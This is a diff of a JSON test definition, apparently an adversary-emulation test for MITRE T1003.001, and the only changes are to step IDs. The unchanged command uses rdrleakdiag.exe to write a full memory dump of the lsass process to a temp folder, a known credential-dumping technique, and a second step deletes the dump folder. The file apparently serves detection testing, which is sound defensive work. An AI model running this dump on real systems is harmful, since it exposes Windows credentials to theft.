@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "64137c4c-28d4-4bf1-8c3d-6162e4a140af",
+      "id": "47eb65b7-0b59-4f12-9e18-2157b4ed2339",
       "type": "execute-command",
       "data": {
         "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n\u0026 $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "4f721e5d-1a6e-4e2f-8eea-48eac4980d36",
+      "id": "8aa1c049-b5e0-4502-9fee-1deec11e1f07",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "64137c4c-28d4-4bf1-8c3d-6162e4a140af",
+      "s": "47eb65b7-0b59-4f12-9e18-2157b4ed2339",
       "p": "on-success",
-      "o": "4f721e5d-1a6e-4e2f-8eea-48eac4980d36"
+      "o": "8aa1c049-b5e0-4502-9fee-1deec11e1f07"
     },
     {
-      "s": "64137c4c-28d4-4bf1-8c3d-6162e4a140af",
+      "s": "47eb65b7-0b59-4f12-9e18-2157b4ed2339",
       "p": "on-failure",
-      "o": "4f721e5d-1a6e-4e2f-8eea-48eac4980d36"
+      "o": "8aa1c049-b5e0-4502-9fee-1deec11e1f07"
     }
   ],
   "tags": [
